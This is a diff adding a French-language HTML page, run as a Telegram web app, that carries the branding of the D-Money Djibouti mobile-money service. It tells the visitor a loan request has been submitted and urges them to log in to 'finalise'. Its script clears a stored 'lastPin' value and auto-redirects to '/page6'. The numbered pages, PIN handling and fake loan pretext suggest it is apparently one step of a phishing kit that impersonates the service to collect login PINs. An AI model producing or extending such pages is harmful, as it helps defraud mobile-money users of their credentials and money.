@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Demande Soumise - D-Money Djibouti</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --dmoney-yellow: #ffcc00; --dmoney-dark: #111111; --bg-color: #f7f9fa; --card-bg: #ffffff; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; position: relative; }
+        .toast-notification { position: absolute; top: 25px; background-color: var(--dmoney-dark); color: #ffffff; padding: 12px 20px; border-radius: 12px; display: flex; align-items: center; gap: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); z-index: 100; font-size: 14px; font-weight: 600; }
+        .toast-icon { width: 22px; height: 22px; background-color: var(--dmoney-yellow); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--dmoney-dark); font-weight: bold; }
+        .card { background: var(--card-bg); width: 90%; max-width: 420px; margin-top: 45px; padding: 40px 24px 35px; border-radius: 24px; box-shadow: 0 6px 25px rgba(0,0,0,0.04); border: 1px solid #edf2f7; display: flex; flex-direction: column; align-items: center; text-align: center; }
+        .check-circle { width: 88px; height: 88px; background-color: var(--dmoney-yellow); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 28px; color: var(--dmoney-dark); font-size: 38px; font-weight: bold; box-shadow: 0 4px 18px rgba(255, 204, 0, 0.3); }
+        .main-title { font-size: 26px; color: #b45309; margin: 0 0 20px; font-weight: 800; }
+        .message-text { color: #666666; font-size: 15px; margin: 0 0 16px; line-height: 1.55; max-width: 320px; }
+        .redirect-box { background-color: #fffdf4; border: 1px solid #fef3c7; border-radius: 12px; padding: 16px 20px; margin: 20px 0 16px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 10px; color: #b45309; font-weight: 700; font-size: 15px; }
+        .spinner { width: 18px; height: 18px; border: 2.5px solid #e0e0e0; border-top: 2.5px solid #b45309; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-outline { background-color: transparent; color: var(--dmoney-dark); border: 1px solid #dcdcdc; width: 100%; padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="toast-notification">
+    <div class="toast-icon">✓</div>
+    <div>🎉 Demande soumise avec succès !</div>
+</div>
+
+<div class="card">
+    <div class="check-circle">✓</div>
+    <h1 class="main-title">Demande Soumise</h1>
+    <p class="message-text">Votre demande de prêt a été transmise. Veuillez patienter pour l'approbation.</p>
+    <p class="message-text">Connectez-vous à D-Money pour finaliser.</p>
+
+    <div class="redirect-box">
+        <div class="spinner"></div>
+        <span>Redirection dans <span id="timer">3</span>s...</span>
+    </div>
+
+    <button type="button" class="btn-outline" onclick="goToPage6()">Se connecter maintenant</button>
+</div>
+
+<script>
+    let timeLeft = 3;
+    let interval;
+    function updateTimer() { const el = document.getElementById('timer'); if (el) el.textContent = timeLeft; }
+    function goToPage6() { if (interval) clearInterval(interval); localStorage.removeItem('lastPin'); window.location.href = "/page6"; }
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) { tg.ready(); tg.expand(); }
+        updateTimer();
+        interval = setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) { clearInterval(interval); goToPage6(); return; }
+            updateTimer();
+        }, 1000);
+    };
+</script>
+</body>
+</html>
